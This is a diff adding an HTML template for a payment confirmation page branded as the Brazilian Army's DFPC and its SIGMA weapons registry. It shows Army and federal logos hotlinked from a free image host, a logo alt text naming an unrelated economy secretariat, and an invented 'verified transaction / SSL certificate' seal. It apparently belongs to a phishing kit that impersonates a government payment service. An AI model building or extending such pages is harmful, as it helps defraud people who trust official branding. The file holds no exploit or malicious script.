@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SIGMA - Confirmação de Pagamento</title>
+
+    <!-- Preload fonts -->
+    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-700.woff2') }}" as="font" type="font/woff2" crossorigin>
+
+    <!-- Styles -->
+    <link href="{{ url_for('static', filename='css/rawline.css') }}" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'rawline', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+    </style>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'custom-blue': '#225BAC',
+                        'custom-yellow': '#F7CD04',
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-gray-50 min-h-screen flex flex-col">
+    <!-- Header -->
+    <div class="bg-white py-4">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center text-center">
+                <img src="https://i.ibb.co/7RG7SfZ/MEAssinatura-1.png" alt="Logo of Secretaria de Estado de Economia" class="h-8 mb-2" />
+                <div>
+                    <p class="text-black text-[10px] leading-tight">
+                        EXÉRCITO BRASILEIRO
+                    </p>
+                    <p class="text-black text-[10px] leading-tight font-bold">
+                        COMANDO LOGÍSTICO - COLOG
+                    </p>
+                    <p class="text-black text-[10px] leading-tight">
+                        DIRETORIA DE FISCALIZAÇÃO DE PRODUTOS CONTROLADOS
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Blue bar -->
+    <div class="bg-custom-blue py-3 shadow-md">
+        <div class="container mx-auto px-4">
+            <span class="text-white text-xl drop-shadow-sm">Confirmação de Pagamento</span>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="container mx-auto px-4 py-8">
+        <div class="max-w-2xl mx-auto">
+            <!-- Success Message -->
+            <div class="bg-white rounded-lg shadow-md p-6 mb-6">
+                <div class="flex items-center justify-center mb-6">
+                    <div class="rounded-full bg-green-100 p-3">
+                        <i class="fas fa-check-circle text-3xl text-green-500"></i>
+                    </div>
+                </div>
+                <h2 class="text-2xl font-bold text-center text-gray-800 mb-4">
+                    Pagamento Processado com Sucesso
+                </h2>
+                <div class="text-center text-gray-600 mb-6">
+                    <p class="mb-2">Seu pagamento foi recebido e está em processamento.</p>
+                    <p>A transferência será creditada em até 7 dias úteis.</p>
+                </div>
+
+                <!-- Transaction Details -->
+                <div class="bg-gray-50 rounded-lg p-4 mb-6">
+                    <h3 class="font-bold text-gray-700 mb-3">Detalhes da Transação</h3>
+                    <div class="space-y-2">
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Protocolo:</span>
+                            <span class="font-medium">{{ payment_id }}</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Data:</span>
+                            <span class="font-medium">{{ payment_date }}</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Valor:</span>
+                            <span class="font-medium">R$ {{ amount }}</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Official Seals -->
+                <div class="border-t pt-6">
+                    <div class="flex flex-wrap justify-center gap-4 items-center">
+                        <img src="https://i.ibb.co/YPXmNbM/governo-federal.png" alt="Governo Federal" class="h-12" />
+                        <img src="https://i.ibb.co/TLBS3F7/exercito-logo.png" alt="Exército Brasileiro" class="h-12" />
+                        <div class="flex flex-col items-center">
+                            <p class="text-sm font-bold text-gray-700">Transação Verificada</p>
+                            <p class="text-xs text-gray-500">Certificado de Segurança SSL</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Next Steps -->
+            <div class="bg-white rounded-lg shadow-md p-6">
+                <h3 class="font-bold text-gray-800 mb-4">Próximos Passos</h3>
+                <div class="space-y-4">
+                    <div class="flex items-start">
+                        <div class="flex-shrink-0 h-6 w-6 rounded-full bg-blue-100 flex items-center justify-center mt-0.5">
+                            <span class="text-sm text-blue-600 font-bold">1</span>
+                        </div>
+                        <div class="ml-3">
+                            <p class="text-gray-700">Aguarde o processamento do pagamento (até 7 dias úteis)</p>
+                        </div>
+                    </div>
+                    <div class="flex items-start">
+                        <div class="flex-shrink-0 h-6 w-6 rounded-full bg-blue-100 flex items-center justify-center mt-0.5">
+                            <span class="text-sm text-blue-600 font-bold">2</span>
+                        </div>
+                        <div class="ml-3">
+                            <p class="text-gray-700">Você receberá um e-mail de confirmação quando o pagamento for processado</p>
+                        </div>
+                    </div>
+                    <div class="flex items-start">
+                        <div class="flex-shrink-0 h-6 w-6 rounded-full bg-blue-100 flex items-center justify-center mt-0.5">
+                            <span class="text-sm text-blue-600 font-bold">3</span>
+                        </div>
+                        <div class="ml-3">
+                            <p class="text-gray-700">Em caso de dúvidas, entre em contato com nossa central de atendimento</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="bg-custom-blue text-white text-center py-3 mt-auto">
+        <p class="text-sm">© {{ current_year }} Exército Brasileiro - DFPC. Todos os direitos reservados.</p>
+        <p class="text-sm">SIGMA - Sistema de Gerenciamento Militar de Armas</p>
+    </div>
+</body>
+</html>
